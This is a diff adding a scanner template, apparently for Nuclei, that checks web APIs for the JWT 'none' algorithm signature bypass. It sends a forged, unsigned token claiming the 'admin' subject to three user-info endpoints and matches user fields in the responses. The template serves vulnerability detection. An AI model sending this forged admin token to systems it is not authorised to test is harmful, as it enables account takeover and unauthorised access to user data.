@@ -1,0 +1,28 @@
+id: jwt-none-algorithm
+info:
+  name: JWT None Algorithm 绕过
+  severity: high
+  description: JWT 使用 none 算法，可绕过签名验证
+  tags: jwt,auth-bypass,high
+  author: poxiao
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/api/user"
+      - "{{BaseURL}}/api/v1/user/info"
+      - "{{BaseURL}}/api/me"
+    headers:
+      Authorization: "Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsImlhdCI6MTcxMDAwMDAwMH0."
+    matchers-condition: and
+    matchers:
+      - type: status
+        status: [200]
+      - type: word
+        words:
+          - "admin"
+          - "username"
+          - "email"
+          - "user_id"
+        condition: or
+        part: body
